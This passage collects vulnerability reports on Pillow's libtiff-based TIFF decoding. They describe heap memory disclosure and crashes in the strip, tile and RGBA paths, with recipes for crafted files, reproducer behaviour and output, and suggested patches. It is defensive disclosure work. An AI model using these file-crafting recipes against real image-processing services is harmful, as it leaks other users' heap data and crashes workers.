(the fresh-`malloc` fill byte), and in a process that has just freed buffers containing `b"LEAK"` they contain 15872 copies of `LEAK`. Feeding the same file to libtiff 4.5.0 directly confirms the library side: `TIFFReadEncodedStrip(t, 0, buf, 65536)` prints `JPEGPreDecode: Warning, Improper JPEG strip/tile size, expected 256x256, got 256x8.`, returns 65536, and leaves 63488 of the 65536 buffer bytes untouched. Pillow installs `TIFFSetWarningHandler(NULL)` (`TiffDecode.c:682`), so the warning is not visible either. The strip path: ```c // src/libImaging/TiffDecode.c:552 /* realloc to fit whole strip */ /* malloc check above */ new_data = realloc(state->buffer, state->bytes); // state->bytes = TIFFStripSize() … state->buffer = new_data; for (; state->y < state->ysize; state->y += rows_per_strip) { … if (TIFFReadEncodedStrip( tiff, TIFFComputeStrip(tiff, state->y, plane), (tdata_t)state->buffer, strip_size ) == -1) { … return -1; } … // iterate over each row in the strip and stuff data into image for (strip_row = 0; strip_row < MIN((INT32)rows_per_strip, state->ysize - state->y); strip_row++) { … shuffler( (UINT8 *)im->image[state->y + state->yoff + strip_row] + state->xoff * im->pixelsize, state->buffer + strip_row * row_byte_size, state->xsize ); ``` `state->buffer` arrives here as the one-row `calloc` made by `decode.c:230` (`(bits*xsize+7)/8` = 256 bytes for the example). The `realloc` to 65536 bytes hands back a different, uninitialised chunk; nothing zeroes it. `TIFFReadEncodedStrip()` returns the nominal strip size on success, not the number of rows produced, and the only check is `== -1`, so the row loop unconditionally copies 256 rows × 256 bytes into `im->image` (which itself is zeroed by `core.new`, so the garbage provably comes from `state->buffer`). `_decodeTile()` has the same shape (`TiffDecode.c:448` `realloc` to `TIFFTileSize()`, then `tile_length` rows copied after each `TIFFReadTile()` at 460–488). For a well-formed file the JPEG inside the strip is 256×256, libtiff fills all 65536 bytes and the copy is correct. The malicious file differs only in the SOF height of the embedded JPEG; libtiff treats "JPEG smaller than strip" as a warning, clamps the row count to the JPEG height, and reports success. JPEG is not the only libtiff codec that succeeds on a short strip. `Fax4Decode` (`Compression=4`) returns success for a T.6 stream that ends early: a 133-byte 512×256 1-bit TIFF whose strip is the Group 4 stream of a 512×16 image loads without error, libtiff writes 17 rows (1088 bytes) of the 16384-byte buffer (`Fax4Decode: Warning, Premature EOL at line 16`, return value 16384) and the other 15296 bytes are again heap contents. LZW, Deflate, PackBits, Group 3 and CCITT RLE were checked and do return -1 on short data, so Pillow raises `OSError` for those. The strip path was introduced in `e91b851fdc1c` ("Add reading old-JPEG compressed TIFFs", 2018-12-08), first released in Pillow 6.0.0, which replaced row-by-row `TIFFReadScanline()` (where libtiff errors on the first missing row) with the whole-strip `realloc()` and copy. The tile path has had the same shape since it was added in `f0436a4ddc95` (2018-07-02, Pillow 5.3.0). ## Impact Any application that opens attacker-supplied images with Pillow in the default configuration and returns something derived from the pixels (thumbnail, preview, format conversion, OCR text) discloses freed heap memory of the worker process to the uploader: everything below the rows the embedded JPEG/G4 stream actually encodes, up to `ImageWidth × RowsPerStrip × SamplesPerPixel` bytes per strip and tens of MB per image within the default `MAX_IMAGE_PIXELS`. `load()` raises nothing, so the application has no signal that the image is malformed. What comes back depends on allocator state; in a long-running web worker it is typically recently freed request bodies, other users' decoded image buffers and Python object contents. There is no memory corruption; this is a read of uninitialised (previously used) heap memory, analogous in effect to an out-of-bounds read that lands in pixels. ## Reproducing `repro` is a short Python script that runs against the installed Pillow build with default settings: no rebuild, no sanitizer, no files written. It runs twice, once normally and once re-executing itself under glibc's `MALLOC_PERTURB_=170`, and the last line it prints is `BUG` or `OK`. **Input.** `tiff(jpeg_rows, tiled)` builds a little-endian TIFF in memory. The header declares a 256×256 8-bit greyscale image with `Compression=7` (JPEG), either as one strip (`RowsPerStrip=256`) or as one 256×256 tile (`TileWidth`/`TileLength`). The strip or tile is a baseline JPEG of 256×`jpeg_rows` pixels, all value 200, written by Pillow's own JPEG encoder. For each layout the script builds two files: - **Control:** `jpeg_rows=256`. This is a well-formed file, and libtiff fills the whole 64 KiB strip/tile. - **Crafted:** `jpeg_rows=8`, 478 bytes (strip) or 490 bytes (tile). The only difference is the embedded JPEG's height. libtiff decodes 8 rows (2048 bytes), warns `Improper JPEG strip/tile size` (Pillow silences the warning) and returns the full strip/tile size as success. **Steps.** Each file is opened (the script asserts it takes the `libtiff` decoder). Just before `im.load()` the script allocates and frees six 64 KiB `bytearray`s filled with `b"LEAK"`, which leaves freed heap chunks about the size of the buffer that `_decodeStrip()`/`_decodeTile()` is about to `realloc()`. For rows 8–255 it then counts copies of `LEAK` and bytes equal to `0x55` (glibc's fresh-`malloc` fill under `MALLOC_PERTURB_=170`). The files contain no `LEAK` bytes (the script asserts this), so any copy in the image came from freed heap memory. It reports `BUG` if a crafted file shows any `LEAK` in the normal pass, or rows 8–255 entirely `0x55` in the perturbed pass. **Expected output on this tree:** ``` [normal ] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] strip crafted ( 478 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [normal ] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [normal ] tiled crafted ( 490 B) rows 8-255: 15872 x b'LEAK', 0/63488 == 0x55, head=b'LEAKLEAK' [perturb] strip well-formed (1222 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] strip crafted ( 478 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' [perturb] tiled well-formed (1234 B) rows 8-255: 0 x b'LEAK', 0/63488 == 0x55, head=b'\xc8\xc8\xc8\xc8\xc8\xc8\xc8\xc8' [perturb] tiled crafted ( 490 B) rows 8-255: 0 x b'LEAK', 63488/63488 == 0x55, head=b'UUUUUUUU' BUG ``` `im.load()` succeeds for every file. For the crafted files rows 8–255 are the uninitialised strip/tile buffer, copied as-is into the image. With the attached patch applied, rows 8–255 of the crafted files come back as `\x00` bytes, with no `LEAK` and no `0x55`, and the script ends with `OK`. The `LEAK` count depends on where glibc places the buffer (the same freed chunk was reused in 500 of 500 runs here); the `MALLOC_PERTURB_` pass does not. The script covers the JPEG codec only. The Group 4 variant in the Details section (`Compression=4`, a T.6 stream that ends early) goes through the same `_decodeStrip()` copy, and the same fix covers it. ## Suggested fix The attached patch zeroes `state->buffer` before each libtiff read in both loops of `src/libImaging/TiffDecode.c` — before `TIFFReadTile()` in `_decodeTile()` and before `TIFFReadEncodedStrip()` in `_decodeStrip()` — so rows a codec does not produce are deterministic zeros rather than stale heap: ```diff --- a/src/libImaging/TiffDecode.c +++ b/src/libImaging/TiffDecode.c @@ _decodeTile for (x = state->xoff; x < state->xsize; x += tile_width) { + memset(state->buffer, 0, state->bytes); if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { @@ _decodeStrip for (plane = 0; plane < planes; plane++) { ImagingShuffler shuffler = unpackers[plane]; + memset(state->buffer, 0, state->bytes); if (TIFFReadEncodedStrip( ``` A `memset` per strip/tile (rather than one `calloc` after the size is known) is needed because the same buffer is reused for every strip, and a short last strip would otherwise expose the previous strip's rows — harmless for disclosure, but the per-read `memset` keeps the behaviour uniform at the cost of one extra pass over the buffer. Promoting libtiff warnings to errors via a warning handler is not a good alternative: both codecs only warn (`Improper JPEG strip/tile size`, `Premature EOL`), but so do many legitimate files (unknown tags, bad tag counts), and the return value of `TIFFReadEncodedStrip()` carries no row count to check against. Initialising the buffer covers every codec. `_decodeAsRGBA()` needs no change: `TIFFRGBAImageGet()` fills its whole raster, and JPEG files do not reach it (`JPEGCOLORMODE_RGB` sends them down the strip path). Valid files decode exactly as before; rows a codec does not produce are now black instead of garbage, and nothing that previously loaded now fails. The patch also adds `test_jpeg_short_strip` to `Tests/test_file_libtiff.py`, parametrised over strip and tile, which builds the 256×8-JPEG-in-256×256 file and asserts rows 8–255 are zero. ### Summary  Pillow's libImaging `_decodeTile` decoder, used to decode tiled TIFF images, allocates a per-tile buffer using `realloc(state->buffer, TIFFTileSize(tiff))`. After each `TIFFReadTile` it then iterates `tile_y` from 0 up to `current_tile_length` and calls the configured row unpacker (here `copy4`) with the source pointer `state->buffer + tile_y * row_byte_size`. When libtiff returns a `tile_bytes_size` smaller than the worst-case `row_byte_size * tile_length`, the inner stride-and-copy loop walks past the realloc'd region and `copy4` performs a 1024-byte `memcpy` that reads up to `(tile_length-1) * row_byte_size + row_byte_size` bytes from a buffer sized only to `tile_bytes_size`. The supplied PoC TIFF triggers a 1024-byte over-read exactly 0 bytes past a 196608-byte allocation. An attacker who can convince a Pillow-using application to decode a crafted TIFF can trigger a process crash (DoS) and may cause adjacent heap memory to be copied into the decoded pixel buffer.  ### Details  Pillow's TIFF decoder, when libtiff reports the file is tiled, takes the `_decodeTile` path. The function:  1. Asks libtiff for `TIFFTileSize(tiff)` (the bytes-per-tile) and `TIFFTileRowSize(tiff)` (the bytes per row *as stored by libtiff*). 2. Reallocates `state->buffer` to exactly `tile_bytes_size`. 3. For each tile origin `(x, y)` and each plane, calls `TIFFReadTile` into `state->buffer`, then walks the tile row by row, calling the configured `ImagingShuffler` (here `copy4`) on each row's worth of source bytes.  The validation done before the loop is:  ```c if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {     state->errcode = IMAGING_CODEC_BROKEN;     return -1; } ```  This rejects oversized libtiff tiles, but it does **not** reject *undersized* ones — i.e. the case where libtiff returns a `tile_bytes_size` strictly **less** than `row_byte_size * tile_length`. The loop body, however, indexes into the buffer assuming the buffer is at least `row_byte_size * tile_length` bytes long.  ### Vulnerable Code  ```c // src/libImaging/TiffDecode.c:446-490 — _decodeTile new_data = realloc(state->buffer, state->bytes);   // bytes = tile_bytes_size if (!new_data) { ... } state->buffer = new_data;  for (y = state->yoff; y < state->ysize; y += tile_length) {     for (plane = 0; plane < planes; plane++) {         ImagingShuffler shuffler = unpackers[plane];         for (x = state->xoff; x < state->xsize; x += tile_width) {             if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { ... }              current_tile_width  = min((INT32)tile_width,  state->xsize - x);             current_tile_length = min((INT32)tile_length, state->ysize - y);             for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                 shuffler(                     (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                     state->buffer + tile_y * row_byte_size,   // <-- OOB stride                     current_tile_width                 );             }         }     } } ```  ```c // src/libImaging/Unpack.c:1288-1291 — copy4 (the crash site) static void copy4(UINT8 *out, const UINT8 *in, int pixels) {     /* RGBA, CMYK quadruples */     memcpy(out, in, 4 * pixels);   // <-- ASAN-detected READ here } ```  The PoC's tile metadata yields `tile_width = tile_length = 256`, `row_byte_size = 1024` (4 bytes/pixel × 256 pixels), and `tile_bytes_size = 196608` (which is 256·256·3 = three-channel-byte storage). The realloc'd buffer is 196608 bytes. The unpacker iterates `tile_y` from 0 to 255 and for the highest rows the source pointer `state->buffer + tile_y * 1024` already lies at or past offset 196608 — the very last row's `memcpy(in=buffer+255·1024, 1024)` reads 1024 bytes starting `260096 - 196608 = 63488` bytes past the allocation; ASAN flags the very first byte past the heap region (`READ of size 1024 at … 0 bytes after 196608-byte region`).  The mismatch is real: libtiff's `TIFFTileSize` returns the *packed* per-tile storage (which depends on the file's photometric/separation layout — it can legitimately be smaller than `row_byte_size × tile_length`), while the inner loop strides as if the buffer always equals `row_byte_size × tile_length`.   ## Attribution  This issue was found by Anthropic from using Claude to study security of open source projects, and I am from Ada Logics helping validate the found issues and report to maintainers. The data in this report has been reviewed manually.

``` ============================================================================ OOB read in TiffDecode.c tile and RGBA paths leaks heap memory into pixels Location: src/libImaging/TiffDecode.c:483  in _decodeTile() Commit:   a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ```  Pillow reads past the end of a heap buffer when decoding certain malformed compressed TIFF files, and copies the bytes it reads into the pixels of the image it returns. An attacker who can get an application to open and load an image file, for example by uploading it to a service that returns thumbnails, previews or converted images, gets back fragments of that process's heap memory, including pointer values. A slightly larger file instead crashes the process. No special settings are needed, and nothing is written out of bounds.  The bug is in `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c`. Both size their decode buffer from libtiff's view of the pixel layout (`TIFFTileSize()`/`TIFFTileRowSize()`, or `img.width * 4`). They then unpack each row with the unpacker that `TiffImagePlugin._setup()` chose from Pillow's own parse of the directory, and neither checks that the unpacker's input row fits inside the row libtiff produced. `_decodeStrip()` has exactly this check, added for OSS-Fuzz `crash-0da0` in 8.2.0, but the tile and RGBA paths never got it.  The two parsers can be made to disagree with a duplicated `PhotometricInterpretation` or `BitsPerSample` tag, because libtiff keeps the first occurrence and Pillow keeps the last. Pillow then unpacks 4 to 8 bytes per pixel from rows that libtiff filled with 1 to 4 bytes, so the last rows of each tile are read from beyond the buffer. The disclosed memory is a few tile rows past the buffer, and the attacker chooses the tile width. The amount does not grow with the number of tiles, because the buffer is reused for every tile.  The tile half was introduced in 1c295bf43 (first released in 8.2.0). The RGBA half was introduced in eb8c1206d, the CVE-2020-35654 fix (8.1.0).  The attached reproducer runs against an unmodified build. It writes three roughly 400-byte files that load without error, yet the last pixel rows of each change with glibc's malloc fill pattern and contain heap pointer bytes. A fourth file with a 65536x16 tile segfaults in `copy4` ← `_decodeTile` (`TiffDecode.c:483`) in most runs, depending on what is mapped after the buffer.  ## Details  `_decodeTile()` and `_decodeAsRGBA()` in `src/libImaging/TiffDecode.c` size `state->buffer` from what libtiff says it will produce (`TIFFTileSize()`, resp. `img.width * 4`), but unpack each row with the shuffler that `TiffImagePlugin._setup()` selected from Pillow's *own* parse of the IFD. Nothing in either function checks that the unpacker's input row (`width * state->bits / 8` bytes) fits inside the row libtiff wrote. `_decodeStrip()` has exactly that check; the other two do not. Whenever the two IFD parsers disagree about the pixel layout — a tag with the wrong count or type that libtiff ignores but Pillow accepts, or a duplicated `PhotometricInterpretation`/`BitsPerSample`/`SamplesPerPixel` entry (libtiff keeps the first occurrence, `ImageFileDirectory_v2.load()` the last) — the unpacker reads past the end of the heap buffer and the bytes it reads become pixels of the returned image. Any Pillow rawmode wider than libtiff's actual sample layout works (`RGBX`, `RGB;16N`, `RGBA;16N`, `I;32`, `F;32F`, …); `RGBA;16N` (64 bits/pixel) against 1-bit libtiff data is the largest ratio, where every row after the first of each tile is read almost entirely from beyond the buffer.  The ~400-byte TIFF `tile_count2.tif` generated by the reproducer — one 16x16 tile, `BitsPerSample 8`, `SamplesPerPixel 1`, `Compression 8` (Adobe Deflate), and `PhotometricInterpretation` written as a SHORT with **count 2** (`6, 6`) — is opened by `Image.open()` as mode `RGB` with libtiff rawmode `RGBX`, and `load()` succeeds on the stock build. Rows 13–15 of the result contain bytes that lie 16, 32 and 48 bytes past the 256-byte tile buffer: decoding the same file twice under `MALLOC_PERTURB_=85` and `=170` yields identical rows 0–12 and different bytes in rows 13–15 (`aa` vs `55`, i.e. glibc's fill pattern). Under an ASan build of the extensions the same `load()` reports `heap-buffer-overflow READ of size 64` in `copy4` (`src/libImaging/Unpack.c:1290`) called from `src/libImaging/TiffDecode.c:483`, against the 256-byte region allocated at `TiffDecode.c:448`. The same layout with a single 65536x16 tile (4.5 KB file) makes the stock build SIGSEGV in `copy4 ← _decodeTile` reading an unmapped address in most runs (whether it faults depends on what is mapped after the 1 MiB buffer; a wider tile makes it reliable).  ### Why the two parsers disagree  libtiff 4.5 rejects a `PhotometricInterpretation` entry whose count is not 1 (`TIFFFetchNormalTag: Incorrect count for "PhotometricInterpretation"; tag ignored`), so for this file `TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, …)` returns 0 and libtiff treats the data as one 8-bit sample per pixel: `TIFFTileSize() = 256`, `TIFFTileRowSize() = 16`.  Pillow keeps the first value and carries on:  ```python # src/PIL/TiffImagePlugin.py:762-770  (ImageFileDirectory_v2._setitem, reached from load())             try:                 (dest[tag],) = values             except ValueError:                 # We've got a builtin tag with 1 expected entry                 warnings.warn(f"Metadata Warning, tag {tag} had too many entries: ...")                 dest[tag] = values[0] ```  so `_setup()` sees `photo == 6`. `OPEN_INFO[(II, 6, (1,), 1, (8,), ())]` is `("L", "L")`, and because the file is compressed the libtiff branch then overrides the rawmode:  ```python # src/PIL/TiffImagePlugin.py:1578, 1600-1607         self.use_load_libtiff = READ_LIBTIFF or self._compression != "raw"         …             if photo == 6:                 self._mode = "RGB"                 if self._compression in "jpeg" and self._planar_configuration == 1:                     rawmode = "RGB"                 else:                     rawmode = "RGBX" ```  `RGBX` is a 32-bit rawmode, so `get_unpacker()` (`src/decode.c:301-309`) sets `state->bits = 32` and `state->shuffle = copy4`. The intent of the `photo == 6` override is that libtiff will deliver RGBA through `TIFFRGBAImage`, but that decision is made in C from *libtiff's* reading of the tag, which here is "not YCbCr":  ```c // src/libImaging/TiffDecode.c:737-764     TIFFGetField(tiff, TIFFTAG_PHOTOMETRIC, &photometric);   // unset -> stays 0     …     readAsRGBA = photometric == PHOTOMETRIC_YCBCR;          // 0     …         if (TIFFIsTiled(tiff)) {             _decodeTile(im, state, tiff, planes, unpackers); // unpackers[0] = copy4 ```  ### The missing check  `_decodeTile()` only guards against libtiff's tile being *larger* than what the unpacker expects, then allocates exactly `TIFFTileSize()` bytes and feeds `row_byte_size`-strided rows to the shuffler:  ```c // src/libImaging/TiffDecode.c:403-487  (_decodeTile)     tile_bytes_size = TIFFTileSize(tiff);                      // 256     …     row_byte_size = TIFFTileRowSize(tiff);                     // 16     …     if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {         // 256 > 1024 is false -> no abort         …     }     state->bytes = tile_bytes_size;     new_data = realloc(state->buffer, state->bytes);           // 256-byte buffer (line 448)     …                 for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                     shuffler(                                   // copy4: reads current_tile_width*4 = 64 bytes                         (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                         state->buffer + tile_y * row_byte_size, // from offset 16*tile_y                         current_tile_width                     ); ```  Row `tile_y` is read from `[16·tile_y, 16·tile_y + 64)`; for `tile_y` = 13, 14, 15 that ends 16, 32, 48 bytes past the 256-byte allocation. In general the last rows of every tile over-read by up to `(state->bits / libtiff_bits_per_pixel − 1) × row_byte_size` bytes, and `row_byte_size` scales with the attacker-chosen `TileWidth`.  Note also that the existing one-sided check at line 434 multiplies the file-controlled `tile_width`/`tile_length` (`UINT32`, accepted up to `INT_MAX` at line 428) by `state->bits` in 32-bit unsigned arithmetic, so `tile_width * state->bits` wraps for `tile_width ≥ 2^32 / bits` (2^26 for the 64-bit rawmodes, 2^27 for `RGBX`/`I;32`/`F;32F`). An 8 KB file declaring a 2,097,152×1 image with `TILEWIDTH = 2^26+16`, `TILELENGTH = 1`, 1-bit data for libtiff and `RGBA;16N` for Pillow makes libtiff allocate an ~8 MB tile from which `unpackRGBA16L` reads 16 MB, and the stock build SIGSEGVs in `unpackRGBA16L ← _decodeTile (TiffDecode.c:483)`; a row-size comparison written in the same 32-bit arithmetic as line 434 would evaluate that row to 128 bytes and still accept it, so the new check must be done in a 64-bit type.  Compare the strip path, which refuses this situation (added for OSS-Fuzz `crash-0da0` in 8.2.0):  ```c // src/libImaging/TiffDecode.c:528-548  (_decodeStrip)     unpacker_row_byte_size = (state->xsize * state->bits / planes + 7) / 8;     …     row_byte_size = TIFFScanlineSize(tiff);     // if the unpacker calculated row size is > row byte size, (at least) the last     // row of the strip will have a read buffer overflow.     if (row_byte_size == 0 || unpacker_row_byte_size > row_byte_size) {         state->errcode = IMAGING_CODEC_BROKEN;         return -1;     } ```  The identical file written with one strip instead of one tile fails `load()` with `OSError: decoder error -2` because of this check.  ### Same gap in `_decodeAsRGBA()`  `_decodeAsRGBA()` always produces `img.width * 4` bytes per row (`TiffDecode.c:325`, buffer allocated at line 339) and unpacks with `state->shuffle` (line 373) without looking at `state->bits`. It is reached when *libtiff* sees YCbCr while Pillow does not force `RGBX`. libtiff marks later duplicates of a tag as ignored (first occurrence wins); Pillow's `ImageFileDirectory_v2.load()` overwrites (`TiffImagePlugin.py:945`, last wins). The reproducer's `ycbcr_dup.tif` is a 16x16 Deflate strip with `PhotometricInterpretation` present twice (`6`, then `2`) and `BitsPerSample` twice (`8,8,8`, then `16,16,16`): libtiff decodes 8-bit YCbCr into a 1024-byte RGBA raster, Pillow selects `RGB;16N` (`state->bits = 48`), and `unpackRGB16L` reads 96 bytes per 64-byte row — ASan reports `heap-buffer-overflow` in `unpackRGB16L` (`Unpack.c:609`) from `TiffDecode.c:373`, past the 1024-byte region from `TiffDecode.c:339`.  The count-2 encoding is not the only lever, and on released versions it is not a lever at all: a 1-sample `photo == 6` file only gets rawmode `RGBX` since the unreleased commit 155330d63 ("Do not open YCbCr colorspace images as RGB without libtiff (#9779)", 2026-08-26). Released versions are reached through duplicated tags instead. A 3-sample tiled file with two `PhotometricInterpretation` entries (`1` or `2`, then `6`) produces the same `copy4` ← `_decodeTile` over-read, since libtiff keeps the first value and decodes 3 bytes per pixel while Pillow keeps `6` and unpacks 4 (the reproducer's `tile_dup.tif`). `ycbcr_dup.tif` above reaches `_decodeAsRGBA()` the same way.  ## Impact  Any application that calls `Image.open()` + `load()` (or `thumbnail()`, `convert()`, `save()`, …) on an untrusted file reaches this with default settings: the file is content-sniffed as TIFF, and any compressed TIFF is decoded through libtiff and `TiffDecode.c` without `READ_LIBTIFF` being set. The over-read bytes are copied into the image's pixel rows, so a service that returns a thumbnail, preview or converted image hands adjacent heap memory back to the uploader, heap pointer values included — up to three libtiff tile rows past the buffer for the `RGBX`-over-8-bit case, with the tile row length (`TileWidth`) chosen by the attacker. `state->buffer` is allocated once and reused for every tile, so each tile re-reads the same region past that one buffer; the distinct heap disclosed per image is about `(unpacker_bpp / libtiff_bpp − 1)` tile rows and does not grow with the tile count. With a wide tile the read runs off the mapping and the process segfaults instead (the 65536x16 case crashes the stock build in most runs, depending on what is mapped after the buffer), taking down the whole worker rather than one request. Writes go to the correctly sized `Imaging` rows, so this is disclosure / crash, not memory corruption.  This is the same family as CVE-2020-35654 (Pillow and libtiff interpreting a YCbCr IFD differently in `TiffDecode.c`); that fix and the later `crash-0da0` fix closed the write and the strip-path read, but the tile path and the RGBA path still trust Pillow's rawmode over libtiff's row size. The tile-path gap was introduced in 1c295bf43c3a ("Check for dimensions and sizes to fit into int", 2021-01-25), which switched `_decodeTile()` from a buffer sized by Pillow's unpacker to `TIFFTileSize()`/`TIFFTileRowSize()`; it is first in Pillow 8.2.0. The `_decodeAsRGBA()` half dates from eb8c1206d6b1 ("Fix CVE-2020-35654 - OOB Write in TiffDecode.c"), first in 8.1.0.  ## Reproducing  Run `repro` (a single Python 3 script) against the installed, unmodified Pillow. No sanitizer build is needed. It writes four TIFFs into a temporary directory, decodes each one in a child process, and removes the directory at the end.  The script writes its TIFFs byte by byte with a small classic-TIFF writer. Each file has a single IFD and a single Deflate-compressed block. Deflate is only there so the file is decoded by libtiff and `TiffDecode.c`. Every pixel byte in the compressed data is defined, so the decoded image should not depend on anything else in the process:  - **`tile_count2.tif`**: a 16x16, 1-sample, 8-bit tile with `PhotometricInterpretation` written as SHORT count 2, `(6, 6)`. Pillow keeps `6` and unpacks with `copy4` (`RGBX`, 4 bytes per pixel). libtiff ignores the tag and decodes 1 byte per pixel. This lever needs 155330d63 (unreleased). - **`tile_dup.tif`**: a 16x16, 3-sample, 8-bit tile with `PhotometricInterpretation` present twice, `2` then `6`. libtiff keeps `2` (RGB, 3 bytes per pixel) and Pillow keeps `6` (`RGBX`, 4 bytes per pixel). This variant also applies to released versions. - **`ycbcr_dup.tif`**: the 16x16 strip with `BitsPerSample` `8,8,8` then `16,16,16` and `PhotometricInterpretation` `6` then `2`. libtiff decodes 8-bit YCbCr through `_decodeAsRGBA()` (4 bytes per pixel), and Pillow unpacks `RGB;16N` with `unpackRGB16L` (6 bytes per pixel). - **`tile_big.tif`**: the `tile_count2.tif` layout with a single 65536x16 tile.  For each of the first three files, the script runs `Image.open()` + `load()` + `tobytes()` twice, once with `MALLOC_PERTURB_=85` and once with `=170`. If the two outputs differ, bytes from beyond the decode buffer have become pixels. In that case it prints the first differing offset and the bytes around it from both runs. On this tree all three differ in their last rows: the `aa`/`55` fill bytes show up, along with heap pointer bytes. The script then decodes `tile_big.tif` and checks for a SIGSEGV (exit status -11). If `gdb` is available, it prints the top frames: `copy4` (`Unpack.c:1290`) ← `_decodeTile` (`TiffDecode.c:483`) ← `ImagingLibTiffDecode`. This crash depends on ASLR, so an occasional run may survive.  Each step prints which `_imaging` build it used and how Pillow opened the file (mode, size and rawmode). The script ends with a one-line summary. The last line is `BUG` if any file leaked heap bytes into its pixels or the big tile crashed the process. Otherwise it is `OK`.  ## Suggested fix  The attached patch restores the `_decodeStrip()` invariant (the unpacker's input row must fit inside libtiff's row) in the two sibling decoders in `src/libImaging/TiffDecode.c`, at the point where each one sizes its buffer:  - `_decodeTile()` computes `unpacker_row_byte_size = ((tsize_t)tile_width * state->bits / planes + 7) / 8` (the `tsize_t` cast keeps the product out of 32-bit arithmetic, so the `TILEWIDTH = 2^26+16` case above cannot wrap past the check on 64-bit builds). It reuses that value for the existing `TIFFTileSize()` sanity check, as `_decodeStrip()` does for strips. After that check and before the `realloc`, it fails with `IMAGING_CODEC_BROKEN` when `unpacker_row_byte_size > row_byte_size` (`TIFFTileRowSize()`). - `_decodeAsRGBA()` fails with `IMAGING_CODEC_BROKEN` when `state->bits > 32`, because `TIFFRGBAImage` rows are always 32 bits per pixel. This check runs before `TIFFRGBAImageBegin()` and any allocation.  With the patch, the tile and RGBA files fail `load()` with `OSError: decoder error -2`, the same result the equivalent strip file already gets. The patch also adds a regression test to `Tests/test_file_libtiff.py` (`test_unpacker_row_wider_than_libtiff_row`). The test embeds the count-2 tile and the duplicated-tag YCbCr strip as base64, following the file's existing convention. The patch was applied to a clean tree and rebuilt: the reproducer no longer triggers, and `Tests/test_file_tiff.py`, `Tests/test_file_libtiff.py` and `Tests/test_tiff_crashes.py` pass.  These checks close the over-read however the two parsers are made to disagree. Separately, `_setup()` could stop deriving the libtiff rawmode from tags that libtiff will read differently — e.g. treat a `PhotometricInterpretation`/`BitsPerSample`/`Compression` that is not a single well-typed value as "unknown pixel mode", the way `ImageWidth`/`ImageLength` are already required to be `int` at `TiffImagePlugin.py:1473`, or have `ImageFileDirectory_v2.load()` keep the first occurrence of a repeated tag as libtiff does (a behaviour change for malformed IFDs that is better made deliberately and separately) — but that only narrows the ways to reach the C-side gap rather than removing it: `TiffImagePlugin` cannot know how libtiff will resolve every malformed directory, and the decoder-side comparisons are what actually bound the read.  ## The patch  Reject TIFFs whose unpacker row is wider than libtiff's decoded row in _decodeTile() and _decodeAsRGBA(), as _decodeStrip() already does  Applies to `src/libImaging/TiffDecode.c` at the commit above.  ```diff diff --git a/Tests/test_file_libtiff.py b/Tests/test_file_libtiff.py index 3d804ea4a..c08dfe77c 100644 --- a/Tests/test_file_libtiff.py +++ b/Tests/test_file_libtiff.py @@ -1232,6 +1232,50 @@ class TestFileLibTiff(LibTiffTestCase):              with pytest.raises(OSError, match="decoder error -9"):                  im.load()   +    @pytest.mark.parametrize( +        "data", +        ( +            # 16x16 8-bit greyscale tile, with a PhotometricInterpretation tag that +            # has two values.
